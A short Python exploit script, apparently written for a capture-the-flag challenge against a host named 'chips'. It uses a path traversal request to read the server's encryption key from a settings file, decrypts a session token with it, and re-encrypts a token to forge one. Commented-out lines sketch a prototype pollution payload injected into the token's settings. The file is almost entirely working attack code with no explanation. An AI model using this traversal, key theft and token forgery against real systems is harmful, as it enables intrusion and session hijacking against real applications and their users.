import requests
import base64
import json
from Crypto import Random
from Crypto.Cipher import AES
from secrets import token_bytes
from pprint import pprint
from Crypto.Util.Padding import pad

def get_crypt_key():
	target = "http://chips/files/....//settings/clientOptions.json"
	r = requests.get(target)
	crypt = json.loads(r.text)['crypt']
	return crypt

def decrypt(s):
	a = base64.b64decode(s).decode()
	obj = json.loads(a)
	encoded_iv = obj['iv']
	encoded_value = obj['value']

	iv = base64.b64decode(encoded_iv)
	ciphertext = base64.b64decode(encoded_value)

	crypt = get_crypt_key()
	# Mode 2 for Cipher-Block Chaining AES_256_CBC
	# Ref: https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html

	decipher = AES.new(crypt['key'].encode(), 2, iv)
	pltext = decipher.decrypt(ciphertext).decode()
	while pltext[-1] != '}': pltext = pltext[:-1] # Remove trailing characters behind a }
	obj = json.loads(pltext)

	return obj

def encrypt(obj):
	crypt = get_crypt_key()

	iv = token_bytes(16)
	cipher = AES.new(crypt['key'].encode(), 2, iv)

	pltext = json.dumps(obj)
	padded = pad(pltext.encode(), cipher.block_size)
	crypted = cipher.encrypt(padded)
	
	encoded_value = base64.b64encode(crypted).decode()
	encoded_iv = base64.b64encode(iv).decode()

	obj = {
		'iv': encoded_iv,
		'value': encoded_value
	}
	
	obj_string = json.dumps(obj)
	s = base64.b64encode(obj_string.encode()).decode()

	return s

if __name__ == '__main__':
	obj = decrypt("eyJpdiI6IktJMTJVbWtSNHVrNVZNNk14THB3MHc9PSIsInZhbHVlIjoiZ0VVQjh4Q3RHdTF3UVFJZGtSTTFKSkFhUTcyU1lHc3cwTjUzUlR0ZmdYR3Jod3d2VE5BVnBtb2pNR1JiQWM3TkluMm11dGVjcXc2WEtBR1VmaWZyaElDTHMwbkl4MWlQbzR6TUM5ajlqdm5Qa1NWL0sveW10NmZOWG5mbk15b0Noek5vVU1CT0xuRzdyZFdTc1d4WkNMYUdZM1BXVkMwZkVUcjF6VzJ6Q3JGTWtKOHlNd1pvbGh3MG5YMjRKdkYrQXFBYjRwU3NEcFV4akdpQ2NMeXJrakxIZ2hZNS9Kb2xZMWFZYjN1TXEzN3BFYjhwOERKdnNkZE9vSlpYdWRKeHVOUW9SbWtpa09qNis0cTVzOFRMQnVoQTlYa1ZXQ3lvSmZHK0V5dUdBSDJURGZiaVpXNkoxQ1h1a0FqVGI0aWVaek9IVjNNaVdld0V1TS8wUnZSa2EwNEkzRlpPQ1pGNEZncnpqZzlZYUdCdlBYbENzK1cxUFlGTy9aWnRWM3hQIn0=")

	# print(obj)
	# obj["connection"]["settings"]["__proto__"] = {
	# 	"toString":"placeholder"
	# }
	# pprint(obj)

	s = encrypt(obj)
	print()
	print("Printing token...")
	print(s)